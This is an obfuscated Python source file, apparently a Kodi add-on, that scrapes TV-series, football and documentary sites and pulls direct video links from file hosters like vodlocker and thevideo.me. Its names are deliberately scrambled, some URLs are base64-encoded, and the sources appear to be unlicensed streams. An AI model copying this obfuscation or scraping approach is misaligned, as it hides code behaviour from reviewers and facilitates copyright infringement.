   O00OOOoOoo0O ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , I1i11i , 10022 , ii11iIi1I + 'dtv.png' )
   if 59 - 59: OoooooooOO * Oo + i1IIi
   if 23 - 23: oOO
   if 13 - 13: iIii1I11I1II1
def OooooOo0 ( url ) :
 oO0 = cloudflare . source ( url )
 OoOO0oo0o = re . compile ( '<a class="season" href="(.+?)">\n(.+?)\n</a>.+?<a class="episode" href=".+?">\n(.+?)\n</a>.+?<a class="episode-name" href=".+?">\n(.+?)</a>' , re . DOTALL ) . findall ( oO0 )
 for I1III1111iIi , I1ii1 , I1Ii , OO0ooOOO0OOO in OoOO0oo0o :
  IiIo0o0OO0o00o0O = ( I1Ii ) . replace ( 'Sezon' , '' ) . replace ( 'bölüm' , '' ) . replace ( 'Bölüm' , '' ) . replace ( 'BÃ¶lÃ¼m' , '' ) . replace ( '.' , '' )
  IIIIIIi1i = ( I1ii1 ) . replace ( 'bölüm' , '' ) . replace ( 'Sezon' , '' ) . replace ( 'Bölüm' , '' ) . replace ( 'BÃ¶lÃ¼m' , '' ) . replace ( '.' , '' )
  iiiii11I1 = 'Season ' + IIIIIIi1i + 'Episode ' + IiIo0o0OO0o00o0O + OO0ooOOO0OOO
  Ii1 ( iiiii11I1 , I1III1111iIi )
  if 77 - 77: i11i1 / OoOoOO00 + iI1Ii11iII1 + oOO - i11iIiiIii
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 44 - 44: OOOo0 + I1IiI + ii11ii1ii . OOOo0 * I1IiI % iIii1I11I1II1
  if 72 - 72: i11i1 . i11i1 - ii11ii1ii
def Ii1 ( name , url ) :
 I1III1111iIi = url
 III1II1i = name
 Iiii1iI1i = cloudflare . source ( I1III1111iIi )
 II11i1I11Ii1i = re . compile ( 'file: "(.+?)",.+?label: "(.+?)",' , re . DOTALL ) . findall ( Iiii1iI1i )
 for I1ii1ii11i1I , iI1i1IiIIIIi in II11i1I11Ii1i :
  IIi1I ( '[COLORgreen]' + III1II1i + iI1i1IiIIIIi + '[/COLOR]' , I1ii1ii11i1I , 10012 , ii11iIi1I + 'dtv.png' )
  if 65 - 65: O0 * OOOo0 / OOOo0 . I1IiI
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 87 - 87: OoOoOO00 * ii11ii1ii % Oo * Oo
 if 58 - 58: i11i1 . OOooOOo + OOOo0 % Oo - Ooo00oOo00o
def I1Iii1Ii1i1 ( ) :
 if 10 - 10: II1i1IiiIIi11 . i1IIi + oO0O
 if 66 - 66: Ooo00oOo00o % OOooOOo
 if 21 - 21: I1IiI - OoooooooOO % i11iIiiIii
 if 71 - 71: i1IIi - OOoo0OO0 * I1I1ii + Ooo0OO0oOO - Ooo00oOo00o % ii11ii1ii
 if 63 - 63: iIii1I11I1II1 + i11i1 . Ooo00oOo00o / OOOo0
 if 84 - 84: i1IIi
 if 42 - 42: OoOoOO00 - Ooo00oOo00o - OoooooooOO . II1i1IiiIIi11 / I1IiI
 if 56 - 56: i11iIiiIii - iIii1I11I1II1 . OoOoOO00
 if 81 - 81: iI1Ii11iII1 / I1IiI * iI1Ii11iII1 . O0
 if 61 - 61: Ooo00oOo00o * i11i1 + I1I1ii . iIii1I11I1II1 % OOoo0OO0 . I1I1ii
 if 53 - 53: I1I1ii * iI1Ii11iII1 / iIii1I11I1II1 / OOOo0 % ii11ii1ii
 if 39 - 39: Ooo00oOo00o / OoooooooOO . Ooo00oOo00o * ii11ii1ii / I1IiI
 if 38 - 38: Ooo00oOo00o / oOO % I1I1ii * OOoo0OO0 + i11iIiiIii % oOO
 if 61 - 61: I1I1ii - oO0O % ii11ii1ii / oOO / II1i1IiiIIi11 + iIii1I11I1II1
 if 87 - 87: I1I1ii + oOO + O0 / i1IIi % iI1Ii11iII1 / I1I1ii
 O00OOOoOoo0O ( '[COLORgreen]Newest Episodes Added[/COLOR]' , 'http://www.watchseries.li/latest' , 10046 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 O00OOOoOoo0O ( '[COLORgreen]This Week\'s Popular Episodes[/COLOR]' , 'http://www.watchseries.li/new' , 10042 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 O00OOOoOoo0O ( '[COLORgreen]Search Program[/COLOR]' , '' , 10043 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 if 64 - 64: Ooo00oOo00o % iI1Ii11iII1 . I1I1ii % Ooo00oOo00o + OOoo0OO0 * iI1Ii11iII1
 if 83 - 83: OOooOOo % Ooo0OO0oOO + OOoo0OO0 % i11iIiiIii + O0
def OoOOoooO000 ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OOOoo = re . compile ( '<ul class="pagination" style="line-height: 3;">(.+?)</ul>' , re . DOTALL ) . findall ( oO0 )
 OoOO0oo0o = re . compile ( '<li><a href="/letters/(.+?)">(.+?)</a></li>' ) . findall ( str ( OOOoo ) )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  O00OOOoOoo0O ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , 'http://watchseries.li/letters/' + url , 10049 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
  if 85 - 85: OOOo0 % OOoo0OO0 + i11i1 / oO0O % OoooooooOO
def i11i11II11i1 ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<a href="(.+?)" class="sr-header">(.+?)</a>' ) . findall ( oO0 )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  O00OOOoOoo0O ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , 'http://watchseries.li/' + url , 10049 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
  if 17 - 17: OoOoOO00 + Oo . I1I1ii
def I1I1i1i ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<li class="col-md-6 col-xs-12 list-movies-li"><a href="(.+?)" title=".+?">(.+?)<span class="epnum">.+?</span></a></li>' , re . DOTALL ) . findall ( oO0 )
 II11i1I11Ii1i = re . compile ( '&hellip;<li><a href=".+?">.+?</a></li><li><a href=".+?">.+?</a></li><li><a href="(.+?)">Next</a></li></ul>' , re . DOTALL ) . findall ( oO0 )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  O00OOOoOoo0O ( '[COLORgreen]' + ( OO0ooOOO0OOO ) . replace ( '&nbsp;' , ' ' ) . replace ( '&' , '&' ) . replace ( '&#039;' , '\'' ) + '[/COLOR]' , 'http://www.watchseries.li' + url , 10044 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 for url in II11i1I11Ii1i :
  O00OOOoOoo0O ( '[COLORgreen]' + 'NEXT' + '[/COLOR]' , 'http://www.watchseries.li' + url , 10049 , ii11iIi1I + 'Next.png' , '' , '' )
  if 87 - 87: I1IiI / iI1Ii11iII1 . oOO - i11i1 / Ooo00oOo00o
  if 41 - 41: OoOoOO00
def II1Iiii11111 ( ) :
 Ooo0OOoOoO0 = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 iiI11I1iiIiII1I = 'http://www.watchseries.li/search/' + Ooo0OOoOoO0 . replace ( ' ' , '%20' )
 oO0 = i11iIIIIIi1 ( iiI11I1iiIiII1I )
 OoOO0oo0o = re . compile ( '<img src="(.+?)".+?<a href="(.+?)" title=".+?"><b>(.+?)</b>' , re . DOTALL ) . findall ( oO0 )
 for IIIIiI11I11 , I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  if 'watch online' in OO0ooOOO0OOO :
   pass
  else :
   print I1i11i
   O00OOOoOoo0O ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , 'http://www.watchseries.li' + I1i11i , 10044 , IIIIiI11I11 , '' , '' )
   if 59 - 59: I1I1ii - iI1Ii11iII1
   xbmcplugin . setContent ( I11i1 , 'movies' )
   if 14 - 14: iIii1I11I1II1 - iIii1I11I1II1
def i111i1I1ii1i ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<img src="(.+?)".+?<div class="block-left-home-inside-text">.+?<a href="(.+?)" title=".+?"><b>(.+?)</b> <br>.+?<span class=".+?">(.+?)</span></a><br>(.+?)<br>' , re . DOTALL ) . findall ( oO0 )
 for IIIIiI11I11 , url , OO0ooOOO0OOO , I1Ii , oOoO00o in OoOO0oo0o :
  O0Oooo = ( OO0ooOOO0OOO ) . replace ( '&nbsp;' , ' ' ) . replace ( '&' , '&' ) . replace ( '&#039;' , '\'' ) + ' - ' + ( I1Ii ) . replace ( '&' , '&' ) . replace ( '&#039;' , '\'' )
  O00OOOoOoo0O ( '[COLORgreen]' + O0Oooo + '[/COLOR]' , 'http://www.watchseries.li' + url , 10045 , IIIIiI11I11 , '' , oOoO00o )
  if 27 - 27: oOO + i11iIiiIii * OOoo0OO0 + I1IiI + II1i1IiiIIi11
def o0o ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<li class="col-md-6 col-xs-12 list-movies-li"><a href="(.+?)" title=".+?">(.+?)<span class="epnum">.+?</span></a></li>' , re . DOTALL ) . findall ( oO0 )
 II11i1I11Ii1i = re . compile ( '&hellip;<li><a href=".+?">.+?</a></li><li><a href=".+?">.+?</a></li><li><a href="(.+?)">Next</a></li></ul>' , re . DOTALL ) . findall ( oO0 )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  O0Oooo = ( OO0ooOOO0OOO ) . replace ( '&nbsp;' , ' ' ) . replace ( '&' , '&' ) . replace ( '&#039;' , '\'' )
  O00OOOoOoo0O ( '[COLORgreen]' + O0Oooo + '[/COLOR]' , 'http://www.watchseries.li' + url , 10045 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 for url in II11i1I11Ii1i :
  O00OOOoOoo0O ( '[COLORgreen]' + 'NEXT' + '[/COLOR]' , 'http://www.watchseries.li' + url , 10046 , ii11iIi1I + 'Next.png' , '' , '' )
  if 17 - 17: iI1Ii11iII1 / ii11ii1ii - OOooOOo * ii11ii1ii
def i11i11II11i ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<div class="mask">.+?<a href="(.+?)" title="(.+?)">.+?<img src="(.+?)"' , re . DOTALL ) . findall ( oO0 )
 II11i1I11Ii1i = re . compile ( '&hellip;<li><a href=".+?">.+?</a></li><li><a href=".+?">.+?</a></li><li><a href="(.+?)">Next</a></li></ul>' , re . DOTALL ) . findall ( oO0 )
 for url , OO0ooOOO0OOO , IIIIiI11I11 in OoOO0oo0o :
  O00OOOoOoo0O ( '[COLORgreen]' + ( OO0ooOOO0OOO ) . replace ( '&nbsp;' , ' ' ) . replace ( '&' , '&' ) . replace ( '&#039;' , '\'' ) + '[/COLOR]' , 'http://www.watchseries.li' + url , 10044 , IIIIiI11I11 , '' , '' )
 for url in II11i1I11Ii1i :
  O00OOOoOoo0O ( '[COLORgreen]' + 'NEXT' + '[/COLOR]' , 'http://www.watchseries.li' + url , 10041 , ii11iIi1I + 'Next.png' , '' , '' )
  if 9 - 9: I1IiI - ii11ii1ii * oOO . oOO - OOOo0
def OOooOooo0OOo0 ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OOOoo = re . compile ( '<div class="col-md-6 col-xs-12".+?<a href=".+?" itemprop="url"><span itemprop="name">(.+?)</span>(.+?)</ul>' , re . DOTALL ) . findall ( oO0 )
 for I1ii1 , OoOOOO in OOOoo :
  OoOO0oo0o = re . compile ( '<li itemprop="episode".+?<meta itemprop="url" content="(.+?)">.+?<span class="" itemprop="name">\n(.+?)\n' , re . DOTALL ) . findall ( str ( OoOOOO ) )
  for url , OO0ooOOO0OOO in OoOO0oo0o :
   O0Oooo = ( I1ii1 ) . replace ( '  ' , '' ) + ' ' + ( OO0ooOOO0OOO ) . replace ( '&nbsp;' , ' ' ) . replace ( '&#039;' , '\'' ) . replace ( '  ' , '' )
   O00OOOoOoo0O ( '[COLORgreen]' + O0Oooo + '[/COLOR]' , 'http://www.watchseries.li' + url , 10045 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 II11i1I11Ii1i = re . compile ( '&hellip;<li><a href=".+?">.+?</a></li><li><a href=".+?">.+?</a></li><li><a href="(.+?)">Next</a></li></ul>' , re . DOTALL ) . findall ( oO0 )
 for url in II11i1I11Ii1i :
  O00OOOoOoo0O ( '[COLORgreen]' + 'NEXT' + '[/COLOR]' , 'http://www.watchseries.li' + url , 10044 , ii11iIi1I + 'Next.png' , '' , '' )
  if 87 - 87: iI1Ii11iII1
  if 17 - 17: oO0O / iIii1I11I1II1 - Ooo00oOo00o + OOOo0 % i11i1
class III1III11II ( ) :
 if 43 - 43: OOOo0
 List = [ ]
 source_list = [ ]
 def __init__ ( self , name ) :
  if 47 - 47: OoooooooOO % I1IiI
  O0Oooo = name
  self . Get_Sources ( I1i11i , O0Oooo )
  if 63 - 63: Ooo00oOo00o / I1IiI * iIii1I11I1II1 . I1I1ii
  if 85 - 85: i11iIiiIii / i11iIiiIii . Ooo00oOo00o . O0
 def Get_Sources ( self , URL , season_name ) :
  Oo0oO0ooo = xbmcgui . DialogProgress ( )
  oO0 = i11iIIIIIi1 ( URL )
  OoOO0oo0o = re . compile ( '<td>.+?<a href="/link/(.+?)".+?height="16px">(.+?)\n' , re . DOTALL ) . findall ( oO0 )
  for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
   URL = 'http://www.watchseries.li/link/' + I1i11i
   self . Get_site_link ( URL , season_name )
   if 67 - 67: OoOoOO00 / OOooOOo . i11i1 . OoooooooOO
 def Get_site_link ( self , url , season_name ) :
  oO0 = i11iIIIIIi1 ( url )
  OoOO0oo0o = re . compile ( '<iframe style=.+?" src="(.+?)"' ) . findall ( oO0 )
  II11i1I11Ii1i = re . compile ( '<IFRAME SRC="(.+?)"' ) . findall ( oO0 )
  I1I1Iiii1 = re . compile ( '<IFRAME style=".+?" SRC="(.+?)"' ) . findall ( oO0 )
  for url in OoOO0oo0o :
   self . main ( url , season_name )
  for url in II11i1I11Ii1i :
   self . main ( url , season_name )
  for url in I1I1Iiii1 :
   self . main ( url , season_name )
   if 19 - 19: iI1Ii11iII1 . ii11ii1ii / I1IiI
 def main ( self , url , season_name ) :
  Oo0oO0ooo . create ( "[COLORwhite]Origin[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
  if 'daclips.in' in url :
   O00oo = 'DACLIPS'
   if O00oo in III1III11II . source_list :
    pass
   else :
    self . daclips ( url , season_name , O00oo )
    Oo0oO0ooo . update ( 0 , "" , "Getting Daclips Links" )
  else :
   if 'filehoot.com' in url :
    O00oo = 'FILEHOOT'
    if O00oo in III1III11II . source_list :
     pass
    else :
     Oo0oO0ooo . update ( 0 , "" , "Getting Filehoot Links" )
     self . filehoot ( url , season_name , O00oo )
   else :
    if 'thevideo.me' in url :
     O00oo = 'THEVIDEO'
     if O00oo in III1III11II . source_list :
      pass
     else :
      self . thevideo ( url , season_name , O00oo )
      Oo0oO0ooo . update ( 0 , "" , "Getting Thevideo Links" )
    else :
     if 'allmyvideos.net' in url :
      O00oo = 'ALLMYVIDEOS'
      if O00oo in III1III11II . source_list :
       pass
      else :
       self . allmyvid ( url , season_name , O00oo )
       Oo0oO0ooo . update ( 0 , "" , "Getting Allmyvideo Links" )
     else :
      if 'vidspot.net' in url :
       O00oo = 'VIDSPOT'
       if O00oo in III1III11II . source_list :
        pass
       else :
        self . vidspot ( url , season_name , O00oo )
        Oo0oO0ooo . update ( 0 , "" , "Getting Vidspot Links" )
      else :
       if 'vodlocker' in url :
        O00oo = 'VODLOCKER'
        if O00oo in III1III11II . source_list :
         pass
        else :
         self . vodlocker ( url , season_name , O00oo )
         Oo0oO0ooo . update ( 0 , "" , "Getting Vodlocker Links" )
         if 75 - 75: iIii1I11I1II1 * i11iIiiIii - OoooooooOO . I1IiI
         if 70 - 70: Ooo0OO0oOO * Ooo0OO0oOO + Oo * i11i1 % OOOo0 + iIii1I11I1II1
 def allmyvid ( self , url , season_name , source_name ) :
  oO0 = i11iIIIIIi1 ( url )
  OoOO0oo0o = re . compile ( '"file" : "(.+?)",\n.+?"default" : .+?,\n.+?"label" : "(.+?)"' , re . DOTALL ) . findall ( oO0 )
  for i1oOOO0ooOO , OO0ooOOO0OOO in OoOO0oo0o :
   self . Printer ( i1oOOO0ooOO , season_name , source_name )
   if 3 - 3: OoooooooOO
 def vidspot ( self , url , season_name , source_name ) :
  oO0 = i11iIIIIIi1 ( url )
  OoOO0oo0o = re . compile ( '"file" : "(.+?)",\n.+?"default" : .+?,\n.+?"label" : "(.+?)"' ) . findall ( oO0 )
  for i1oOOO0ooOO , OO0ooOOO0OOO in OoOO0oo0o :
   self . Printer ( i1oOOO0ooOO , season_name , source_name )
   if 71 - 71: iI1Ii11iII1 + i1IIi - II1i1IiiIIi11 - i11iIiiIii . OOoo0OO0 - oOO
 def thevideo ( self , url , season_name , source_name ) :
  oO0 = i11iIIIIIi1 ( url )
  OoOO0oo0o = re . compile ( "{ label: '.+?', file: '(.+?)' }" ) . findall ( oO0 )
  for i1oOOO0ooOO in OoOO0oo0o :
   self . Printer ( i1oOOO0ooOO , season_name , source_name )
   if 85 - 85: ii11ii1ii - I1IiI / ii11ii1ii + i11i1 - II1i1IiiIIi11
 def vodlocker ( self , url , season_name , source_name ) :
  oO0 = i11iIIIIIi1 ( url )
  OoOO0oo0o = re . compile ( 'file: "(.+?)",.+?skin' , re . DOTALL ) . findall ( oO0 )
  for i1oOOO0ooOO in OoOO0oo0o :
   self . Printer ( i1oOOO0ooOO , season_name , source_name )
   if 49 - 49: Ooo00oOo00o - O0 / Ooo00oOo00o * I1IiI + I1I1ii
 def daclips ( self , url , season_name , source_name ) :
  oO0 = i11iIIIIIi1 ( url )
  OoOO0oo0o = re . compile ( '{ file: "(.+?)", type:"video" }' ) . findall ( oO0 )
  for i1oOOO0ooOO in OoOO0oo0o :
   self . Printer ( i1oOOO0ooOO , season_name , source_name )
   if 35 - 35: OoOoOO00 . OOOo0 / i1IIi / OOOo0 * Ooo0OO0oOO
 def filehoot ( self , url , season_name , source_name ) :
  oO0 = i11iIIIIIi1 ( url )
  OoOO0oo0o = re . compile ( 'file: "(.+?)",.+?skin' , re . DOTALL ) . findall ( oO0 )
  for i1oOOO0ooOO in OoOO0oo0o :
   self . Printer ( i1oOOO0ooOO , season_name , source_name )
   if 85 - 85: OoOoOO00 . oOO % i11i1 % OOoo0OO0
 def Printer ( self , Link , season_name , source_name ) :
  if 80 - 80: Ooo0OO0oOO * OOoo0OO0 / iIii1I11I1II1 % Ooo0OO0oOO / iIii1I11I1II1
  if Link in III1III11II . List :
   pass
  elif source_name in III1III11II . source_list :
   pass
  else :
   IIi1I ( '[COLORgreen]' + source_name + '[/COLOR]' , Link , 10012 , ii11iIi1I + 'WATCHSERIES.png' )
   Oo0oO0ooo . update ( 100 , "" , "Got Source" )
   III1III11II . List . append ( Link )
   III1III11II . source_list . append ( source_name )
   if 42 - 42: i1IIi / i11iIiiIii . Oo * II1i1IiiIIi11 . i11iIiiIii * O0
   xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
   if 44 - 44: i1IIi . OOOo0 / i11iIiiIii + iI1Ii11iII1
   if 27 - 27: i11i1
   if 52 - 52: I1I1ii % I1IiI + iIii1I11I1II1 * Ooo0OO0oOO . oO0O
   if 95 - 95: iIii1I11I1II1 . iI1Ii11iII1 - OoooooooOO * Ooo00oOo00o / OOooOOo
   if 74 - 74: Ooo0OO0oOO
def iII1i1IIiI1I ( ) :
 O00OOOoOoo0O ( '[COLORgreen]Highlights[/COLOR]' , '' , 10008 , ii11iIi1I + 'ORIGINFOOTBALL.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Fixtures[/COLOR]' , '' , 10009 , ii11iIi1I + 'ORIGINFOOTBALL.png' , i1iiIII111ii , '' )
 if 67 - 67: oO0O
def iIII11Iiii1 ( ) :
 IIIII1II = i11iIIIIIi1 ( i1111 ( 'aHR0cDovL2xpdmVvbnNhdC5jb20vcXVpY2tpbmRleC5odG1s' ) )
 OoOO0oo0o = re . compile ( '<a target="_self" href="(.+?)".+?src="(.+?)" alt="(.+?)"' , re . DOTALL ) . findall ( IIIII1II )
 for I1i11i , IIIIiI11I11 , OO0ooOOO0OOO in OoOO0oo0o :
  O00OOOoOoo0O ( '[COLORgreen]' + ( OO0ooOOO0OOO ) . replace ( 'amp;' , '' ) + '[/COLOR]' , i1111 ( 'aHR0cDovL2xpdmVvbnNhdC5jb20v' ) + I1i11i , 10010 , i1111 ( 'aHR0cDovL2xpdmVvbnNhdC5jb20v' ) + IIIIiI11I11 , i1iiIII111ii , '' )
  if 95 - 95: OOOo0
def o0OoO0OOoO0Oo0 ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OOOoo = re . compile ( 'AndClearL.+?><h2.+?head>(.*?)float' , re . DOTALL ) . findall ( oO0 )
 for OOOoo in OOOoo :
  oO00O = re . compile ( '(.*?)</h2>' ) . findall ( str ( OOOoo ) )
  for II111IiiiI1 in oO00O :
   II111IiiiI1 = II111IiiiI1
  oooOO0oo0Oo00 = re . compile ( 'comp_head>(.*?)</span>.*?<div class = fLeft width = ".*?"><img src="(.*?)">.*?</div>.*?ST:(.*?)</div>(.+?)<!-- around all of channel types ENDS 2-->' , re . DOTALL ) . findall ( str ( OOOoo ) )
  for oOoO , IIIIiI11I11 , time , iI111I1III in oooOO0oo0Oo00 :
   OOOOO0O00 = re . compile ( ",CAPTION, '(.+?)&nbsp" ) . findall ( iI111I1III )
   O00OOOoOoo0O ( '[COLORgreen]' + II111IiiiI1 + ' - ' + oOoO + ' - ' + time + '[/COLOR]' , '' , 10010 , i1111 ( 'aHR0cDovL2xpdmVvbnNhdC5jb20=' ) + IIIIiI11I11 , i1iiIII111ii , ( str ( OOOOO0O00 ) ) )
   if 36 - 36: OOoo0OO0 % i11i1
 Oo0oO ( 'tvshows' , 'Media Info 3' )
 if 72 - 72: OOOo0 / II1i1IiiIIi11 - O0 + OOoo0OO0
def o0iIIIIi ( ) :
 if 50 - 50: I1I1ii + oOO + II1i1IiiIIi11
 O00OOOoOoo0O ( '[COLORgreen]Shows[/COLOR]' , 'http://www.fullmatchesandshows.com/category/show/' , 10011 , 'http://www.fm-base.co.uk/forum/attachments/club-competition-logos/3885-soccer-am-logo-socceram.png' , ii11iIi1I + 'fanart.jpg' , '' )
 O00OOOoOoo0O ( '[COLORgreen]Premier League[/COLOR]' , 'http://www.fullmatchesandshows.com/premier-league/' , 10011 , 'https://footballseasons.files.wordpress.com/2013/05/premier-league.png' , ii11iIi1I + 'fanart.jpg' , '' )
 O00OOOoOoo0O ( '[COLORgreen]La Liga[/COLOR]' , 'http://www.fullmatchesandshows.com/la-liga/' , 10011 , 'http://1.bp.blogspot.com/-c6kQ40ryhyo/U19cUlz25sI/AAAAAAAABak/qtn5chSFZm0/s1600/la-liga-logo_display_image.png' , ii11iIi1I + 'fanart.jpg' , '' )
 O00OOOoOoo0O ( '[COLORgreen]Bundesliga[/COLOR]' , 'http://www.fullmatchesandshows.com/bundesliga/' , 10011 , 'http://m.img.brothersoft.com/iphone/189/518670189_icon175x175.jpg' , ii11iIi1I + 'fanart.jpg' , '' )
 O00OOOoOoo0O ( '[COLORgreen]Champions League[/COLOR]' , 'http://www.fullmatchesandshows.com/champions-league/' , 10011 , 'http://www.ecursuri.ro/images/teste/test-champions-league.jpg' , ii11iIi1I + 'fanart.jpg' , '' )
 O00OOOoOoo0O ( '[COLORgreen]Serie A[/COLOR]' , 'http://www.fullmatchesandshows.com/category/serie-a/' , 10011 , 'http://files.jcriccione.it/200000223-2484526782/serie%20a.png' , ii11iIi1I + 'fanart.jpg' , '' )
 O00OOOoOoo0O ( '[COLORgreen]Ligue 1[/COLOR]' , 'http://www.fullmatchesandshows.com/category/ligue-1/' , 10011 , 'http://a1.mzstatic.com/us/r30/Purple5/v4/37/c7/44/37c744ae-5824-42b7-6ce0-5f471f52baab/icon180x180.jpeg' , ii11iIi1I + 'fanart.jpg' , '' )
 O00OOOoOoo0O ( '[COLORgreen]Copa America 2015[/COLOR]' , 'http://www.fullmatchesandshows.com/copa-america-2015/' , 10011 , 'https://pbs.twimg.com/profile_images/521966985907691520/Nq9OAPIo_400x400.png' , ii11iIi1I + 'fanart.jpg' , '' )
 O00OOOoOoo0O ( '[COLORgreen]CONCACAF[/COLOR]' , 'http://www.fullmatchesandshows.com/category/concacaf/' , 10011 , 'http://a3.mzstatic.com/us/r30/Purple3/v4/40/26/14/4026147c-7022-4ca3-504e-e78950cc3f1c/icon175x175.png' , ii11iIi1I + 'fanart.jpg' , '' )
 O00OOOoOoo0O ( '[COLORgreen]Women World Cup[/COLOR]' , 'http://www.fullmatchesandshows.com/category/women-world-cup/' , 10011 , 'https://upload.wikimedia.org/wikipedia/en/thumb/7/76/2015_FIFA_Women\'s_World_Cup_logo.svg/967px-2015_FIFA_Women\'s_World_Cup_logo.svg.png' , ii11iIi1I + 'fanart.jpg' , '' )
 if 15 - 15: OOoo0OO0
def IiiI11I1IIiI ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( 'itemprop="image" class="entry-thumb" src="(.+?)".+?<h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="(.+?)" rel="bookmark" title=".+?">(.+?)</a></h3>' , re . DOTALL ) . findall ( oO0 )
 for IIIIiI11I11 , url , OO0ooOOO0OOO in OoOO0oo0o :
  i1iI1i = OO0ooOOO0OOO . replace ( '&#8211;' , '-' ) . replace ( '&#038;' , '&' )
  IIi1I ( '[COLORgreen]' + i1iI1i + '[/COLOR]' , url , 10013 , IIIIiI11I11 )
  if 59 - 59: iI1Ii11iII1
def oOoO0OOO00O ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<script data-config="(.+?)" data-height' ) . findall ( oO0 )
 for I1ii1ii11i1I in OoOO0oo0o :
  OOOOO0o0OOo = ( I1ii1ii11i1I ) . replace ( '/v2' , '' ) . replace ( 'zeus.json' , 'video-sd.mp4?hosting_id=21772' ) . replace ( 'config.playwire.com' , 'cdn.video.playwire.com' )
  o00OOo ( 'http:' + OOOOO0o0OOo )
  if 40 - 40: iI1Ii11iII1 * Ooo0OO0oOO % OOoo0OO0 * ii11ii1ii
  if 80 - 80: iIii1I11I1II1 - OoooooooOO - ii11ii1ii - ii11ii1ii . OoooooooOO
def I1i ( url ) :
 IIIII1II = iI1 ( url )
 OoOO0oo0o = re . compile ( '<a href="([^"]*)" title="([^"]*)"><img itemprop="image" content="([^"]*)"' , re . DOTALL ) . findall ( IIIII1II )
 II11i1I11Ii1i = re . compile ( "<a rel='next' href=([^=]*)=" , re . DOTALL ) . findall ( IIIII1II )
 for url , OO0ooOOO0OOO , IIIIiI11I11 in OoOO0oo0o :
  IIi1I ( OO0ooOOO0OOO , url , 8046 , IIIIiI11I11 )
 for url in II11i1I11Ii1i :
  I1111I1II11 ( 'NEXT PAGE' , ( url ) . replace ( ' class' , '' ) , 8045 , ii11iIi1I + 'Next.png' )
def I11I ( url ) :
 IIIII1II = iI1 ( url )
 OoOO0oo0o = re . compile ( "__filename='([^']*)',.+?__fullimage='([^']*)',.+?__title='([^']*)'," , re . DOTALL ) . findall ( IIIII1II )
 for url , IIIIiI11I11 , OO0ooOOO0OOO in OoOO0oo0o :
  o00OOo ( 'http://bitcast-b.bitgravity.com/ndtvod/23372/ndtv/' + url )
  if 81 - 81: i11iIiiIii + i11iIiiIii * Ooo00oOo00o + iI1Ii11iII1
def iii ( url ) :
 IIIII1II = iI1 ( url )
 OoOO0oo0o = re . compile ( "src='http://www.youtube.com/embed/(.+?)?version=3&#038;rel=1&#038;fs=1&#038;autohide=2&#038;showsearch=0&#038;showinfo=1&#038;iv_load_policy=1&#038;wmode=transparent' frameborder='0' allowfullscreen='true'></iframe>" ) . findall ( IIIII1II )
 for url in OoOO0oo0o :
  yt . PlayVideo ( url )
  if 15 - 15: OOOo0 . Ooo00oOo00o
def IiiIii1ii1I ( ) :
 IIIII1II = iI1 ( i1111 ( 'aHR0cDovL3RvcGRvY3VtZW50YXJ5ZmlsbXMuY29tLw==' ) )
 OoOO0oo0o = re . compile ( '<a href="(.+?)" >(.+?)</a></li><li>' ) . findall ( IIIII1II )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( OO0ooOOO0OOO , I1i11i , 8041 , ii11iIi1I + 'documentary.png' )
def IiiIII ( url ) :
 IIIII1II = iI1 ( url )
 OoOO0oo0o = re . compile ( '<h2><a href="(.+?)" title="(.+?)">.+?</a></h2>.+?src="(.+?)"' , re . DOTALL ) . findall ( IIIII1II )
 II11i1I11Ii1i = re . compile ( 'class="inactive">.+?</a><a href="(.+?)">Next</a></div>' , re . DOTALL ) . findall ( IIIII1II )
 for url , OO0ooOOO0OOO , IIIIiI11I11 in OoOO0oo0o :
  I1111I1II11 ( ( OO0ooOOO0OOO ) . replace ( '&#039;s' , '' ) , url , 8042 , IIIIiI11I11 )
 for url in II11i1I11Ii1i :
  I1111I1II11 ( 'NEXT PAGE' , url , 8041 , ii11iIi1I + 'Next.png' )
  if 41 - 41: OoOoOO00 * oOO
  if 68 - 68: oO0O - OOOo0
def ii1I11II1 ( url ) :
 IIIII1II = iI1 ( url )
